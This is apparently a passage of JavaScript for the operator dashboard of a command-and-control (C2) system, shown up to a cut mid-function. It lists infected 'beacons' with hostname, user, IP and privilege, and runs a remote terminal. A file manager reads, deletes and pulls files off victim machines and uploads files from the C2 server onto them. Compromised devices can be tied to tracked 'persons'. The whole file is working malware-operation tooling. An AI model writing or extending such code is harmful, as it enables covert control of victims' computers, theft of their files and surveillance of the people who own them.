const ApiClient = {
    _csrf: localStorage.getItem('csrf_token') || '',
    async fetch(url, opts = {}) {
        if (!opts.headers) opts.headers = {};
        if (opts.method && opts.method !== 'GET') {
            opts.headers['X-CSRF-Token'] = this._csrf;
        }
        if (opts.body && typeof opts.body === 'object' && !(opts.body instanceof FormData)) {
            opts.headers['Content-Type'] = 'application/json';
            opts.body = JSON.stringify(opts.body);
        }
        try {
            const r = await fetch(url, opts);
            if (r.status === 401) { window.location.href = '/'; return null; }
            if (r.status === 403 && opts.method && opts.method !== 'GET') {
                const fres = await fetch('api.php?action=csrf');
                if (fres.ok) {
                    const fd = await fres.json();
                    this._csrf = fd.token || '';
                    localStorage.setItem('csrf_token', this._csrf);
                    opts.headers['X-CSRF-Token'] = this._csrf;
                    const r2 = await fetch(url, opts);
                    if (r2.status === 401) { window.location.href = '/'; return null; }
                    const ct2 = r2.headers.get('content-type') || '';
                    return ct2.includes('json') ? await r2.json() : r2;
                }
                window.location.href = '/';
                return null;
            }
            const ct = r.headers.get('content-type') || '';
            return ct.includes('json') ? await r.json() : r;
        } catch (e) {
            tm('Network error: ' + e.message, 1);
            return null;
        }
    },
    get(action, params) {
        let q = 'api.php?action=' + encodeURIComponent(action);
        if (params) {
            for (const k of Object.keys(params)) q += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
        }
        return this.fetch(q);
    },
    post(action, body) {
        return this.fetch('api.php?action=' + encodeURIComponent(action), { method: 'POST', body });
    },
    async syncCsrf() {
        const r = await this.fetch('api.php?action=csrf');
        if (r && r.token) { this._csrf = r.token; localStorage.setItem('csrf_token', r.token); }
        return this._csrf;
    }
};

let SEL = '';
const TRMS = {};
let TID = 0;
let FM_PATH = '/';
let _refRunning = false;
let _refTimer = null;

function es(s) { return String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

function tm(m, e) {
    const t = document.getElementById('toast');
    if (!t) return;
    t.textContent = m;
    t.className = 'toast' + (e ? ' r' : ' g');
    t.style.display = 'block';
    setTimeout(() => t.style.display = 'none', 3000);
}

function toggleHumans() {
    const sb = document.getElementById('psb');
    const tg = document.getElementById('hm-tg');
    const on = sb.classList.toggle('off');
    tg.classList.toggle('on', !on);
    localStorage.setItem('hm_tg', on ? '0' : '1');
    if (!on) loadPersons();
}

(function () {
    const v = localStorage.getItem('hm_tg');
    if (v === '1') {
        document.getElementById('psb').classList.remove('off');
        document.getElementById('hm-tg').classList.add('on');
        loadPersons();
    }
})();

function rT(u) {
    const el = document.getElementById('tout');
    if (!el) return;
    if (!TRMS[u]) TRMS[u] = [];
    el.innerHTML = TRMS[u].map(l => '<div class="l ' + l.t + '">' + es(l.v) + '</div>').join('');
    el.scrollTop = el.scrollHeight;
}

function tA(u, t, v) {
    if (!TRMS[u]) TRMS[u] = [];
    TRMS[u].push({ t, v });
    if (TRMS[u].length > 300) TRMS[u].splice(0, 100);
    if (u === SEL) rT(u);
}

function SECS_AGO(d) {
    if (!d) return 999;
    const n = new Date(), p = new Date(d.replace(' ', 'T') + 'Z');
    return isNaN(p.getTime()) ? 999 : (n - p) / 1000;
}

let _beaconCache = [];
let _taskCache = [];
let _mediaCache = [];
let _fileCache = [];
let _personCache = [];
let _hist = [];
let _histIdx = -1;

function buildList(beacons) {
    _beaconCache = beacons;
    const el = document.getElementById('blist');
    beacons.forEach(b => {
        const secs = SECS_AGO(b.last_seen);
        if (b.status === 'active' && secs > 60) b.status = 'dead';
    });
    const live = beacons.filter(b => b.status === 'active');
    const dead = beacons.filter(b => b.status !== 'active');
    const q = (document.getElementById('bf').value || '').toLowerCase();
    let html = '';
    if (live.length) {
        html += '<div class="grp"><div class="gl">&#9679; Active <span class="ct">' + live.length + '</span></div></div>';
        live.forEach(b => {
            if (q && !b.hostname.toLowerCase().includes(q) && !(b.uuid || '').includes(q) && !(b.ip || '').includes(q) && !(b.nickname || '').toLowerCase().includes(q)) return;
            html += bitem(b, 'g');
        });
    }
    if (dead.length) {
        html += '<div class="grp"><div class="gl">&#9719; Inactive <span class="ct">' + dead.length + '</span></div></div>';
        dead.forEach(b => {
            if (q && !b.hostname.toLowerCase().includes(q) && !(b.uuid || '').includes(q) && !(b.ip || '').includes(q) && !(b.nickname || '').toLowerCase().includes(q)) return;
            html += bitem(b, 'r');
        });
    }
    if (!html) html = '<div style="padding:30px;text-align:center;color:var(--text2);font-size:11px">Nothing found</div>';
    el.innerHTML = html;
    document.getElementById('bcnt').textContent = '(' + beacons.length + ')';
    if (SEL) {
        const selEl = document.querySelector('.bit[data-u="' + CSS.escape(SEL) + '"]');
        if (selEl) selEl.classList.add('sel');
    }
    document.getElementById('bf').focus();
}

function bitem(b, c) {
    const nm = b.nickname || b.hostname || 'unknown';
    const sub = b.username + ' @ ' + b.ip;
    const nk = b.nickname ? '<span class="nick">' + es(b.nickname) + '</span> <span class="un">(' + es(b.hostname || '') + ')</span>' : es(b.hostname || 'unknown');
    const ls = b.last_seen ? b.last_seen.substring(5, 16) : '';
    return '<div class="bit" data-u="' + es(b.uuid) + '" onclick="selB(this.dataset.u)">' +
        '<span class="dd" style="background:' + (c === 'g' ? 'var(--green)' : 'var(--red)') + '"></span>' +
        '<div class="bi"><div class="nm">' + nk + '</div><div class="sb2">' + es(sub) + '</div></div>' +
        '<span class="ts">' + ls + '</span></div>';
}

async function selB(uuid) {
    SEL = uuid;
    document.querySelectorAll('.bit').forEach(el => el.classList.remove('sel'));
    const item = document.querySelector('.bit[data-u="' + CSS.escape(uuid) + '"]');
    if (item) item.classList.add('sel');
    document.getElementById('wc').style.display = 'none';
    document.getElementById('bp').classList.add('on');
    document.getElementById('tc').classList.add('on');
    const b = _beaconCache;
    const be = b ? b.find(x => x.uuid === uuid) : null;
    const nm = be ? es(be.nickname || be.hostname || '') : '';
    document.getElementById('th-n').textContent = nm || uuid.substring(0, 8);
    const th = await ApiClient.get('terminal', { beacon_uuid: uuid });
    if (th && th.length) {
        TRMS[uuid] = th.map(e => ({ v: e.command + '\n' + (e.output || ''), t: 'w' }));
        rT(uuid);
    } else {
        if (TRMS[uuid] && TRMS[uuid].length) rT(uuid);
        else { tA(uuid, 's', 'Terminal for ' + (nm || uuid)); rT(uuid); }
    }
    await loadInfo(uuid);
    await loadBF(uuid);
    await loadBM(uuid);
    if (be && be.notes) document.getElementById('nt-in').value = be.notes;
    loadPersons();
}

function filterB() {
    const q = (document.getElementById('bf').value || '').toLowerCase();
    if (!_beaconCache.length) { ApiClient.get('beacons').then(d => { if (d) { _beaconCache = d; buildList(d); } }); return; }
    buildList(_beaconCache);
}

async function loadInfo(uuid) {
    const b = _beaconCache;
    if (!b) return;
    const be = b.find(x => x.uuid === uuid);
    if (!be) { document.getElementById('binfo').innerHTML = '<span style="color:var(--text2)">Not found</span>'; return; }
    const st = be.status || 'dead';
    const secs = SECS_AGO(be.last_seen);
    const ago = secs < 120 ? Math.round(secs) + 's ago' : secs < 3600 ? Math.round(secs / 60) + 'm ago' : Math.round(secs / 3600) + 'h ago';
    const nick = be.nickname || '';
    const dc = be.disconnected_at || '--';
    const pi = await ApiClient.get('device_info', { beacon_uuid: uuid });
    const host = pi && pi.hostname ? pi.hostname : (be.hostname || '-');
    const os = pi && pi.os ? pi.os : (be.os || '-');
    const user = pi && pi.username ? pi.username : (be.username || '-');
    const ip = pi && pi.ip ? pi.ip : (be.ip || '-');
    const priv = pi && pi.privilege ? pi.privilege : (be.privilege || 'user');
    document.getElementById('binfo').innerHTML =
        '<span class="l">Nickname</span><span><input class="nick-input" id="nick-in" value="' + es(nick) + '" placeholder="set nickname" onchange="renameB(\'' + es(uuid) + '\',this.value)" style="width:' + Math.max(60, (nick.length || 6) * 8) + 'px"></span>' +
        '<span class="l">UUID</span><span class="tt">' + es(be.uuid) + '</span>' +
        '<span class="l">Hostname</span><span><b>' + es(host) + '</b></span>' +
        '<span class="l">OS</span><span>' + es(os) + '</span>' +
        '<span class="l">User</span><span>' + es(user) + '</span>' +
        '<span class="l">IP</span><span>' + es(ip) + '</span>' +
        '<span class="l">Privilege</span><span><span class="tg ' + (priv === 'root' || priv === 'admin' ? 'tg-r' : 'tg-b') + '">' + es(priv) + '</span></span>' +
        '<span class="l">PID</span><span>' + (be.pid || '-') + '</span>' +
        '<span class="l">Status</span><span><span class="tg ' + (st === 'active' ? 'tg-g' : 'tg-r') + '">' + st + '</span></span>' +
        '<span class="l">Last Seen</span><span>' + es(be.last_seen || '-') + ' (' + ago + ')</span>' +
        '<span class="l">Disconnected</span><span>' + dc + '</span>' +
        '<span class="l">First Seen</span><span>' + es(be.first_seen || '-') + '</span>' +
        (pi && pi.collected_at ? '<span class="l">Info Saved</span><span>' + es(pi.collected_at) + '</span>' : '') +
        '<span class="l">CTOS</span><span id="ctos-link-' + es(uuid) + '">' + es('<loading...>') + '</span>' +
        '<span class="l"></span><span><button class="btn btn-xs btn-r" onclick="removeDevice(\'' + es(uuid) + '\')">&#128465; Remove Device</button></span>';
    const ps = _personCache && _personCache.length ? _personCache : await ApiClient.get('persons');
    _personCache = ps || _personCache;
    const per = getPersonForDevice(uuid, ps);
    const el = document.getElementById('ctos-link-' + uuid);
    if (per) {
        el.innerHTML = '<span class="tg tg-b" style="cursor:pointer" onclick="openPerson(\'' + per.id + '\')">&#128100; ' + es(per.name) + '</span> <span class="btn btn-xs btn-gh" onclick="unlinkDevicePerson(\'' + per.id + '\',\'' + uuid + '\')" style="font-size:8px">x</span>';
    } else {
        const opts = ps && ps.length ? ps.map(p => '<option value="' + p.id + '">' + es(p.name) + '</option>').join('') : '<option value="">No persons</option>';
        el.innerHTML = '<span style="font-size:10px;color:var(--text2)">None</span> <select id="ctos-ls-' + es(uuid) + '" style="width:auto;display:inline;font-size:9px;padding:1px 4px" onchange="linkDevicePerson(this,\'' + es(uuid) + '\')"><option value="">Link...</option>' + opts + '</select>';
    }
}

async function renameB(uuid, nick) {
    await ApiClient.post('rename', { uuid, nickname: nick });
    document.getElementById('th-n').textContent = es(nick || uuid.substring(0, 8));
    if (_beaconCache.length) buildList(_beaconCache);
}

async function removeDevice(uuid) {
    if (!confirm('Permanently remove device ' + uuid.substring(0, 8) + '...? This will delete all data.')) return;
    const r = await ApiClient.post('remove_device', { uuid });
    if (r && r.status === 'ok') {
        if (SEL === uuid) { SEL = ''; document.getElementById('bp').classList.remove('on'); document.getElementById('wc').classList.add('on'); }
        _beaconCache = await ApiClient.get('beacons') || [];
        buildList(_beaconCache);
        tm('Device removed');
    } else { tm('Failed to remove device', 1); }
}

async function saveNotes() {
    const text = document.getElementById('nt-in').value;
    if (!SEL) return;
    const r = await ApiClient.post('savenotes', { uuid: SEL, text });
    if (r && r.status === 'ok') {
        document.getElementById('nt-st').textContent = 'Saved at ' + new Date().toLocaleTimeString();
        setTimeout(() => document.getElementById('nt-st').textContent = '', 2000);
    } else { tm('Failed to save notes', 1); }
}

let _fmTimer = null;

function fmToggle() {
    const card = document.getElementById('fm-card');
    card.classList.toggle('fm-on');
    if (card.classList.contains('fm-on')) {
        if (!SEL) { tm('Select a device first', 1); card.classList.remove('fm-on'); return; }
        if (!document.getElementById('fm-in')) {
            document.getElementById('fm-pb').innerHTML = fmPB('/') +
                ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
                ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
                ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
            document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Enter a path and press Enter, or click Go.</div>';
        }
        if (!_fmTimer) _fmTimer = setInterval(() => { if (SEL && FM_PATH) fmRefresh(); }, 30000);
    } else {
        if (_fmTimer) { clearInterval(_fmTimer); _fmTimer = null; }
    }
}

function fmPB(path) {
    const segs = path.split('/').filter(Boolean);
    let html = '<span class="pth pth-cur" onclick="fmNav(\'/\')">/</span>';
    let cur = '';
    for (const s of segs) {
        cur += '/' + s;
        const cls = cur === path ? 'pth pth-cur' : 'pth';
        html += '<span class="' + cls + '" onclick="fmNav(\'' + es(cur) + '\')">' + es(s) + '</span>';
        html += '<span style="color:var(--text2)">/</span>';
    }
    return html;
}

async function fmInit(uuid) {
    FM_PATH = '/';
    document.getElementById('fm-nm').textContent = '';
    const cached = await ApiClient.get('browse_cache', { beacon_uuid: uuid, path: '/' });
    if (cached && cached.entries) {
        FM_PATH = '/';
        fmRender(cached.entries, '/');
        document.getElementById('fm-pb').innerHTML = fmPB('/') +
            ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
            ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
    } else {
        document.getElementById('fm-body').innerHTML = '<div class="fm-ld"><div class="sp"></div> Browsing...</div>';
        document.getElementById('fm-pb').innerHTML = fmPB('/') +
            ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
            ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
        fmSendBrowse(uuid, '/');
    }
}

function fmGo() {
    const inp = document.getElementById('fm-in');
    if (!inp || !inp.value.trim()) return;
    FM_PATH = inp.value.trim();
    fmNav(FM_PATH);
}

async function fmNav(path) {
    if (!SEL) return;
    FM_PATH = path;
    document.getElementById('fm-nm').textContent = path;
    document.getElementById('fm-pb').innerHTML = fmPB(path) +
        ' <input id="fm-in" value="' + es(path) + '" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
        ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
        ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
    const cached = await ApiClient.get('browse_cache', { beacon_uuid: SEL, path });
    if (cached && cached.entries) {
        fmRender(cached.entries, path);
    } else {
        document.getElementById('fm-body').innerHTML = '<div class="fm-ld"><div class="sp"></div> Browsing...</div>';
        fmSendBrowse(SEL, path);
    }
}

function fmRefresh() {
    if (!SEL || !FM_PATH) return;
    const body = document.getElementById('fm-body');
    if (!body) return;
    body.innerHTML = '<div class="fm-ld"><div class="sp"></div> Refreshing...</div>';
    fmSendBrowse(SEL, FM_PATH);
}

async function fmSendBrowse(uuid, path) {
    const r = await ApiClient.post('browse_req', { beacon_uuid: uuid, path });
    if (r && r.task_id) {
        fmPollBrowse(uuid, path, r.task_id, 0);
    } else {
        document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Failed to send browse command.</div>';
    }
}

function fmPollBrowse(uuid, path, tid, count) {
    if (count > 30) { document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Timed out.</div>'; return; }
    setTimeout(async () => {
        const res = await ApiClient.get('results', { task_id: tid });
        if (res && res.length) {
            const out = res[0].output || '';
            try {
                const j = JSON.parse(out);
                if (j.files) {
                    await ApiClient.post('browse_cache', { beacon_uuid: uuid, path, entries: j.files });
                    if (uuid === SEL && path === FM_PATH) fmRender(j.files, path);
                } else if (j.type === 'file') {
                    const parent = path.split('/').slice(0, -1).join('/') || '/';
                    fmNav(parent);
                } else if (j.error) {
                    document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Error: ' + es(j.error) + '</div>';
                }
            } catch (e) {
                document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Unexpected response. Try a different path.</div>';
            }
        } else {
            fmPollBrowse(uuid, path, tid, count + 1);
        }
    }, count === 0 ? 6000 : 5000);
}

function fmRender(entries, path) {
    const el = document.getElementById('fm-body');
    if (!entries || !entries.length) {
        el.innerHTML = '<div class="fm-nf">Empty directory.</div>';
        return;
    }
    const isRoot = path === '/';
    let html = '<table class="fm-t"><thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th></th></tr></thead><tbody>';
    if (!isRoot) {
        const parent = path.split('/').slice(0, -1).join('/') || '/';
        html += '<tr><td class="fn" onclick="fmNav(\'' + es(parent) + '\')"><span style="color:var(--amber)">&#8617; ..</span></td><td></td><td></td><td></td><td></td></tr>';
    }
    const dirs = entries.filter(e => e.type === 'dir').sort((a, b) => a.name.localeCompare(b.name));
    const files = entries.filter(e => e.type !== 'dir').sort((a, b) => a.name.localeCompare(b.name));
    for (const e of [...dirs, ...files]) {
        const fullPath = (path === '/' ? '' : path) + '/' + e.name;
        const sz = e.type === 'dir' ? '--' : (e.size > 1048576 ? (e.size / 1048576).toFixed(1) + 'M' : e.size > 1024 ? (e.size / 1024).toFixed(1) + 'K' : e.size + 'B');
        const mod = e.modified ? e.modified.substring(0, 16).replace('T', ' ') : '--';
        const icon = e.type === 'dir' ? '&#128193;' : '&#128196;';
        html += '<tr>';
        if (e.type === 'dir') {
            html += '<td class="fn" onclick="fmNav(\'' + es(fullPath) + '\')">' + icon + ' ' + es(e.name) + '</td>';
        } else {
            html += '<td class="fn" onclick="fmReadFile(\'' + es(fullPath) + '\')">' + icon + ' ' + es(e.name) + '</td>';
        }
        html += '<td>' + sz + '</td>';
        html += '<td>' + es(e.type) + '</td>';
        html += '<td style="font-size:10px;color:var(--text2)">' + mod + '</td>';
        html += '<td class="act">';
        if (e.type === 'file') {
            html += '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();fmReadFile(\'' + es(fullPath) + '\')">Read</button>';
            html += '<button class="btn btn-xs btn-b" onclick="event.stopPropagation();fmDownload(\'' + es(fullPath) + '\',\'' + es(e.name) + '\')">DL</button>';

        }
        html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();fmProp(\'' + es(fullPath) + '\',\'' + es(e.type) + '\',' + (e.size || 0) + ',\'' + es(e.perms || '') + '\',\'' + es(e.modified || '') + '\')">Info</button>';
        html += '<button class="btn btn-xs btn-r" onclick="event.stopPropagation();if(confirm(\'Delete ' + es(e.name) + '?\'))fmDelete(\'' + es(fullPath) + '\')">Del</button>';
        html += '</td></tr>';
    }
    html += '</tbody></table>';
    el.innerHTML = html;
}

async function fmReadFile(path) {
    if (!SEL) return;
    tA(SEL, 'g', '$ read ' + path);
    tA(SEL, 's', 'Reading file...');
    const r = await ApiClient.post('task', { beacon_uuid: SEL, command: 'read ' + path });
    if (r && r.status === 'created') {
        fmPollRead(SEL, r.id, 0, path);
    } else { tA(SEL, 'r', 'Failed to send read command'); }
}

function fmPollRead(uuid, tid, count, path) {
    if (count > 30) { tA(uuid, 'r', 'Read timed out'); return; }
    setTimeout(async () => {
        const res = await ApiClient.get('results', { task_id: tid });
        if (res && res.length) {
            const out = res[0].output || '(empty)';
            if (TRMS[uuid] && TRMS[uuid].length && TRMS[uuid][TRMS[uuid].length - 1].t === 's') TRMS[uuid].pop();
            tA(uuid, 'w', out);
            showReadModal(out, path);
        } else { fmPollRead(uuid, tid, count + 1, path); }
    }, count === 0 ? 6000 : 5000);
}

function showReadModal(content, path) {
    let m = document.getElementById('fm-read-m');
    if (!m) {
        m = document.createElement('div');
        m.id = 'fm-read-m';
        m.className = 'modal';
        m.innerHTML = '<div class="modal-c" style="max-width:80vw"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b style="font-size:12px" id="fm-read-title">File</b><button class="btn btn-xs btn-gh" onclick="document.getElementById(\'fm-read-m\').classList.remove(\'on\')">Close</button></div><pre class="fm-read" id="fm-read-c"></pre></div>';
        document.body.appendChild(m);
    }
    document.getElementById('fm-read-title').textContent = path;
    document.getElementById('fm-read-c').textContent = content;
    m.classList.add('on');
    m.onclick = function (e) { if (e.target === m) m.classList.remove('on'); };
}

async function fmDelete(path) {
    if (!SEL) return;
    tA(SEL, 'g', '$ rm ' + path);
    tA(SEL, 's', 'Deleting...');
    const r = await ApiClient.post('file_delete', { beacon_uuid: SEL, path });
    if (r && r.status === 'created') {
        fmPollAction(SEL, r.task_id, 0, path, 'deleted');
    } else { tA(SEL, 'r', 'Failed to send delete command'); }
}

async function fmDownload(path, name) {
    if (!SEL) return;
    tA(SEL, 'g', '$ upload ' + path);
    tA(SEL, 's', 'Downloading from beacon...');
    const r = await ApiClient.post('task', { beacon_uuid: SEL, command: 'upload ' + path });
    if (r && r.status === 'created') {
        fmPollAction(SEL, r.task_id, 0, path, 'downloaded');
    } else { tA(SEL, 'r', 'Failed to send upload command'); }
}

async function fmUploadToTarget() {
    if (!SEL || !FM_PATH) { tm('Select a device and path first', 1); return; }
    const files = _fileCache || [];
    if (!files.length) { tm('No files on C2 server. Upload one first.', 1); return; }
    let m = document.getElementById('fm-utm');
    if (!m) {
        m = document.createElement('div'); m.id = 'fm-utm'; m.className = 'modal';
        m.innerHTML = '<div class="modal-c" style="max-width:450px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b style="font-size:12px">&#11015; Upload to Target</b><button class="btn btn-xs btn-gh" onclick="this.closest(\'.modal\').classList.remove(\'on\')">&#10005;</button></div><div id="fm-utm-c"></div></div>';
        document.body.appendChild(m);
    }
    m.classList.add('on');
    const mc = document.getElementById('fm-utm-c');
    let list = files.map((f, i) => '<label style="display:block;padding:4px 6px;border-bottom:1px solid var(--border);cursor:pointer"><input type="radio" name="fmf" value="' + f.id + '" data-name="' + es(f.filename) + '" ' + (i===0?'checked':'') + '> <span style="font-size:12px">' + es(f.filename) + '</span> <span style="font-size:10px;color:var(--text2)">(id:' + f.id + ')</span></label>').join('');
    list += '<div style="margin-top:8px;display:flex;gap:6px;align-items:center"><input id="fm-utm-name" value="" placeholder="filename (optional)" style="flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:5px 8px;color:var(--text);font-size:11px"><button class="btn btn-g" onclick="fmDoUpload()">Upload</button></div>';
    mc.innerHTML = list;
    // pre-fill name with selected file's name
    document.querySelectorAll('input[name="fmf"]').forEach(el => el.addEventListener('change', () => {
        document.getElementById('fm-utm-name').value = el.dataset.name;
    }));
    const checked = document.querySelector('input[name="fmf"]:checked');
    if (checked) document.getElementById('fm-utm-name').value = checked.dataset.name;
}

async function fmDoUpload() {
    const sel = document.querySelector('input[name="fmf"]:checked');
    if (!sel) { tm('Select a file', 1); return; }
    const fid = sel.value;
    const name = document.getElementById('fm-utm-name').value.trim() || sel.dataset.name;
    const base = FM_PATH === '/' ? '' : FM_PATH.replace(/\/+$/, '');
    const targetPath = base + '/' + name;
    document.getElementById('fm-utm').classList.remove('on');
    tA(SEL, 'g', '$ download ' + fid + ' ' + targetPath);
    tA(SEL, 's', 'Uploading to target...');
    const r = await ApiClient.post('task', { beacon_uuid: SEL, command: 'download ' + fid + ' ' + targetPath });
    if (r && r.status === 'created') {
        fmPollAction(SEL, r.task_id, 0, targetPath, 'uploaded');
    } else { tA(SEL, 'r', 'Failed to send upload command'); }
}

function fmPollAction(uuid, tid, count, path, label) {
    if (count > 30) { tA(uuid, 'r', 'Action timed out'); return; }
    setTimeout(async () => {
        const res = await ApiClient.get('results', { task_id: tid });
        if (res && res.length) {
            const out = res[0].output || '(done)';
            if (TRMS[uuid] && TRMS[uuid].length && TRMS[uuid][TRMS[uuid].length - 1].t === 's') TRMS[uuid].pop();
            tA(uuid, 'w', out);
            tm(path + ' ' + label, 0);
            if (uuid === SEL) { await loadBF(SEL); fmRefresh(); }
        } else { fmPollAction(uuid, tid, count + 1, path, label); }
    }, count === 0 ? 6000 : 5000);
}

function fmProp(path, type, size, perms, modified) {
    let m = document.getElementById('fm-prop-m');
    if (!m) {
        m = document.createElement('div');
        m.id = 'fm-prop-m';
        m.className = 'modal';
        m.innerHTML = '<div class="modal-c" style="max-width:400px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b style="font-size:12px">Properties</b><button class="btn btn-xs btn-gh" onclick="document.getElementById(\'fm-prop-m\').classList.remove(\'on\')">Close</button></div><div class="fm-prop" id="fm-prop-c"></div></div>';
        document.body.appendChild(m);
    }
    const szStr = size > 1048576 ? (size / 1048576).toFixed(2) + ' MB' : size > 1024 ? (size / 1024).toFixed(2) + ' KB' : size + ' B';
    document.getElementById('fm-prop-c').innerHTML =
        '<span class="fp-l">Name:</span>' + es(path.split('/').pop()) + '<br>' +
        '<span class="fp-l">Path:</span>' + es(path) + '<br>' +
        '<span class="fp-l">Type:</span>' + es(type) + '<br>' +
        '<span class="fp-l">Size:</span>' + szStr + '<br>' +
        '<span class="fp-l">Perms:</span>' + es(perms || '--') + '<br>' +
        '<span class="fp-l">Modified:</span>' + es(modified || '--') + '<br>';
    m.classList.add('on');
    m.onclick = function (e) { if (e.target === m) m.classList.remove('on'); };
}

function dfToggle() {
    const card = document.getElementById('df-card');
    card.classList.toggle('df-on');
    if (!card.classList.contains('df-on')) return;
    if (!SEL) { tm('Select a device first', 1); card.classList.remove('df-on'); return; }
    loadDeviceFiles(SEL);
}

async function loadDeviceFiles(uuid) {
    const el = document.getElementById('df-body');
    document.getElementById('df-nm').textContent = '';
    el.innerHTML = '<div class="fm-ld"><div class="sp"></div> Loading...</div>';
    const r = await ApiClient.get('ls_device', { beacon_uuid: uuid });
    if (!r || !r.entries || !r.entries.length) {
        el.innerHTML = '<div class="fm-nf">No device files yet. Upload files or capture media to populate.</div>';
        return;
    }
    const dirs = {}, files = [];
    for (const e of r.entries) {
        const parts = e.path.split('/');
        if (parts.length === 1) {
            files.push(e);
        } else {
            const top = parts[0];
            if (!dirs[top]) dirs[top] = { name: top, type: 'dir', count: 0, total_size: 0 };
            dirs[top].count++;
            if (e.type === 'file') dirs[top].total_size += e.size;
        }
    }
    let html = '<table class="fm-t"><thead><tr><th>Name</th><th>Items</th><th>Size</th><th></th></tr></thead><tbody>';
    for (const d of Object.values(dirs).sort((a, b) => a.name.localeCompare(b.name))) {
        const sz = d.total_size > 1048576 ? (d.total_size / 1048576).toFixed(1) + 'M' : d.total_size > 1024 ? (d.total_size / 1024).toFixed(1) + 'K' : d.total_size + 'B';
        html += '<tr><td class="fn" onclick="dfOpenDir(\'' + es(uuid) + '\',\'' + es(d.name) + '\')">&#128193; ' + es(d.name) + '</td><td>' + d.count + '</td><td>' + sz + '</td><td class="act"><button class="btn btn-xs btn-gh" onclick="event.stopPropagation();dfOpenDir(\'' + es(uuid) + '\',\'' + es(d.name) + '\')">Open</button></td></tr>';
    }
    for (const f of files.sort((a, b) => a.name.localeCompare(b.name))) {
        const sz = f.size > 1024 ? (f.size / 1024).toFixed(1) + 'K' : f.size + 'B';
        html += '<tr><td>&#128196; ' + es(f.name) + '</td><td>--</td><td>' + sz + '</td><td class="act">' +
            (f.name === 'notes.txt' ? '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();dfReadNote(\'' + es(uuid) + '\')">View</button>' : '') +
            '</td></tr>';
    }
    html += '</tbody></table>';
    el.innerHTML = html;
    document.getElementById('df-nm').textContent = '(' + r.entries.length + ' items)';
}

async function dfOpenDir(uuid, dir) {
    const el = document.getElementById('df-body');
    el.innerHTML = '<div class="fm-ld"><div class="sp"></div> Loading ' + dir + '...</div>';
    const r = await ApiClient.get('ls_device', { beacon_uuid: uuid });
    if (!r || !r.entries) { el.innerHTML = '<div class="fm-nf">Error loading.</div>'; return; }
    const prefix = dir + '/';
    const items = r.entries.filter(e => e.path.startsWith(prefix));
    let html = '<div style="margin-bottom:6px"><button class="btn btn-xs btn-gh" onclick="loadDeviceFiles(\'' + es(uuid) + '\')">&#8617; Back</button> <b style="font-size:11px">/' + es(dir) + '/</b></div>';
    html += '<table class="fm-t"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr></thead><tbody>';
    const dirs = items.filter(e => e.type === 'dir').sort((a, b) => a.name.localeCompare(b.name));
    const fils = items.filter(e => e.type === 'file').sort((a, b) => a.name.localeCompare(b.name));
    for (const e of [...dirs, ...fils]) {
        const sz = e.type === 'dir' ? '--' : (e.size > 1024 ? (e.size / 1024).toFixed(1) + 'K' : e.size + 'B');
        const mod = (e.modified || '').substring(0, 16);
        const icon = e.type === 'dir' ? '&#128193;' : '&#128196;';
        const path = e.path;
        html += '<tr><td>' + icon + ' ' + es(e.name) + '</td><td>' + sz + '</td><td style="font-size:10px;color:var(--text2)">' + mod + '</td><td class="act">';
        if (e.type === 'file') {
            const ext = (e.name || '').split('.').pop().toLowerCase();
            if (['txt', 'md', 'json', 'xml', 'yml', 'yaml', 'ini', 'cfg', 'conf', 'log', 'sh', 'py', 'js', 'html', 'php', 'css', 'rb', 'pl', 'go', 'rs', 'toml', 'env', 'sql', 'csv'].includes(ext)) {
                html += '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();dfReadFile(\'' + es(uuid) + '\',\'' + es(path) + '\')">Read</button>';
            }
            if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
                html += '<button class="btn btn-xs btn-b" onclick="event.stopPropagation();dfViewMedia(\'' + es(uuid) + '\',\'' + es(path) + '\')">View</button>';
            }
            html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();dfDownload(\'' + es(uuid) + '\',\'' + es(path) + '\',\'' + es(e.name) + '\')">DL</button>';
        }
        html += '</td></tr>';
    }
    html += '</tbody></table>';
    el.innerHTML = html;
}

async function dfReadFile(uuid, path) {
    const resp = await ApiClient.get('device_read', { beacon_uuid: uuid, path });
    if (!resp) { tm('Failed to read file', 1); return; }
    const text = resp instanceof Response ? await resp.text() : JSON.stringify(resp);
    showReadModal(text, path);
}

async function dfReadNote(uuid) { await dfReadFile(uuid, 'notes.txt'); }

async function dfViewMedia(uuid, path) {
    const img = document.getElementById('mim-s');
    if (img) {
